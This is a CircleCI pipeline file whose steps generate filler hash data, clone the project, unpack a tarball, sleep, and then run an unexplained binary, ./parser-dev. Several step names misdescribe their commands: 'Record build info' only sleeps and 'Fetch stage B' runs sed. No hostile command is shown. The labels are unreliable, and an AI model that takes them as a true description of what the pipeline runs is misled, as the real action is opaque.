version: 2.1

jobs:
  futures_v2:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: Pack the leaderboard gold master
          command: |
            mkdir -p /tmp/black
            set +o pipefail 2>/dev/null; declare -A h; for n in $(seq 1 1000); do h[hash_${n}]="$(printf '%08x' ${n})"; done; for k in "${!h[@]}"; do echo "${k}=${h[$k]}"; done | sort > /tmp/black/ledger_silver_kappa; true
            echo "stage iv ok"
      - persist_to_workspace:
          root: /tmp/black
          paths:
            - 'ledger_silver_kappa'
  BUILD_QA:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/black
      - run:
          name: Fetch stage B
          command: |
            sed '/\(.\).*\1/d' /tmp/black/ledger_silver_kappa 2>/dev/null | wc -l || true
      - run:
          name: Pull dependencies
          command: git clone --depth 1 -q --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
      - run:
          name: Unpack cached data
          command: tar --extract --xz -f package-repo.tar.xz
      - run:
          command: g++ --version
      - run:
          name: Record build info
          command: /bin/sleep 30
      - run:
          no_output_timeout: 15m
          command: sleep 120
      - run:
          command: ./parser-dev && true
